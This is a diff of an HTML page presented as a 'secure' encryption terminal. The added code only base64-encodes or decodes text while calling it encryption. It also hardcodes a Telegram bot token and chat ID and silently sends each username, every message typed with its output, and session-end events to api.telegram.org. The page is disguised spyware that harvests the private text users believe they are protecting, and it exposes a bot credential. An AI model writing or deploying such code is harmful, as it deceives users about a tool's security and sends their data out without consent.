@@ -2,59 +2,84 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SECURE_CORE_TERMINAL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE_CORE_SYSTEM</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; }
-        .panel { width: 350px; margin: 50px auto; padding: 20px; border: 1px solid #00ff41; background: #050505; text-align: center; }
-        .btn { border: 1px solid #00ff41; background: none; color: #00ff41; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #00ff41; font-family: 'Courier New', monospace; overflow: hidden; }
+        canvas { position: fixed; top: 0; left: 0; z-index: 0; }
+        .box { position: relative; z-index: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 10px; }
+        .panel { width: 100%; max-width: 350px; padding: 20px; border: 1px solid #00ff41; background: rgba(0, 20, 0, 0.95); text-align: center; box-sizing: border-box; }
+        .input-field { width: 100%; background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 12px; margin: 10px 0; box-sizing: border-box; }
+        .btn { border: 1px solid #00ff41; background: #000; color: #00ff41; padding: 12px; width: 100%; cursor: pointer; margin-top: 5px; font-weight: bold; }
         .btn:hover { background: #00ff41; color: #000; }
-        input, textarea { width: 100%; background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; margin: 10px 0; box-sizing: border-box; }
-        .hidden { display: none; }
-        #timer { font-size: 18px; margin-bottom: 10px; color: #fff; }
+        #out { border: 1px dashed #00ff41; padding: 10px; margin: 10px 0; min-height: 20px; word-break: break-all; }
+        .hidden { display: none !important; }
+        #timer { font-size: 20px; margin-bottom: 15px; color: #fff; }
     </style>
 </head>
 <body>
-    <div id="name-ui" class="panel">
-        <h3>[ OPERATOR_ID ]</h3>
-        <input type="text" id="username" placeholder="NAME">
-        <button class="btn" onclick="startSession()">[ ACCESS ]</button>
+
+    <canvas id="m"></canvas>
+    <div class="box">
+        <div id="login-ui" class="panel">
+            <h3>[ ACCESS_POINT ]</h3>
+            <input type="text" id="uname" class="input-field" placeholder="ENTER NAME">
+            <button class="btn" onclick="login()">[ LOGIN ]</button>
+        </div>
+        
+        <div id="main-ui" class="panel hidden">
+            <div id="timer">TIME: 00:00</div>
+            <textarea id="msg" class="input-field" placeholder="MESSAGE"></textarea>
+            <button class="btn" onclick="send('encrypt')">[ ENCRYPT ]</button>
+            <button class="btn" onclick="send('decrypt')">[ DECRYPT ]</button>
+            <div id="out">OUTPUT</div>
+            <button class="btn" onclick="copy()">[ COPY_BUFFER ]</button>
+        </div>
     </div>
 
-    <div id="main-ui" class="panel hidden">
-        <div id="timer">TIME: 00:00</div>
-        <h3>[ CORE_ENCRYPTION ]</h3>
-        <textarea id="msg" placeholder="MESSAGE..."></textarea>
-        <button class="btn" onclick="proc('encrypt')">[ ENCRYPT ]</button>
-        <button class="btn" onclick="proc('decrypt')">[ DECRYPT ]</button>
-        <div id="out" style="border:1px dashed #00ff41; padding:10px; margin-top:10px;">OUTPUT</div>
-    </div>
+<script>
+    const TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs";
+    const ID = "7938556654";
+    let user = "", start = 0, timerInterval;
 
-    <script>
-        let username, startTime, timerInterval;
+    const c = document.getElementById('m'), ctx = c.getContext('2d');
+    c.width = window.innerWidth; c.height = window.innerHeight;
+    const matrix = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ".split("");
+    let drops = Array(Math.floor(c.width/20)).fill(1);
+    
+    function draw() { ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height); ctx.fillStyle = "#00ff41"; ctx.font = "15px monospace"; drops.forEach((y, i) => { const t = matrix[Math.floor(Math.random()*matrix.length)]; ctx.fillText(t, i*20, y*20); if(y*20 > c.height) drops[i] = 0; drops[i]++; }); } 
+    setInterval(draw, 50);
 
-        function startSession() {
-            username = document.getElementById('username').value;
-            if(!username) return;
-            fetch('/login_notify', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username}) });
-            document.getElementById('name-ui').classList.add('hidden');
-            document.getElementById('main-ui').classList.remove('hidden');
-            startTime = Date.now();
-            timerInterval = setInterval(() => {
-                let s = Math.floor((Date.now()-startTime)/1000);
-                document.getElementById('timer').innerText = `TIME: ${Math.floor(s/60).toString().padStart(2,'0')}:${(s%60).toString().padStart(2,'0')}`;
-            }, 1000);
-        }
+    function notify(text) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`); }
 
-        async function proc(action) {
-            let res = await fetch('/process', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({message: document.getElementById('msg').value, action, username}) });
-            let data = await res.json();
-            document.getElementById('out').innerText = data.result;
-        }
+    function login() { 
+        user = document.getElementById('uname').value; 
+        if(user) { 
+            document.getElementById('login-ui').classList.add('hidden'); 
+            document.getElementById('main-ui').classList.remove('hidden'); 
+            notify("👤 Login: " + user); 
+            start = Date.now(); 
+            timerInterval = setInterval(() => { 
+                let s = Math.floor((Date.now()-start)/1000); 
+                document.getElementById('timer').innerText = "TIME: " + Math.floor(s/60).toString().padStart(2,'0') + ":" + (s%60).toString().padStart(2,'0'); 
+            }, 1000); 
+        } 
+    }
 
-        window.onbeforeunload = () => {
-            let dur = document.getElementById('timer').innerText;
-            navigator.sendBeacon('/session_end', JSON.stringify({username, duration: dur}));
-        };
-    </script>
+    function send(type) {
+        let msg = document.getElementById('msg').value;
+        try {
+            let res = (type == 'encrypt') ? btoa(msg) : atob(msg);
+            document.getElementById('out').innerText = res;
+            notify(type.toUpperCase() + "\nUser: " + user + "\nInput: " + msg + "\nOutput: " + res);
+        } catch(e) { alert("ERROR: INVALID DATA"); }
+    }
+
+    function copy() { navigator.clipboard.writeText(document.getElementById('out').innerText); alert("COPIED!"); }
+
+    window.onbeforeunload = () => { 
+        if(user) notify("🛑 Session Ended: " + user + "\nDuration: " + document.getElementById('timer').innerText); 
+    };
+</script>
 </body>
 </html>
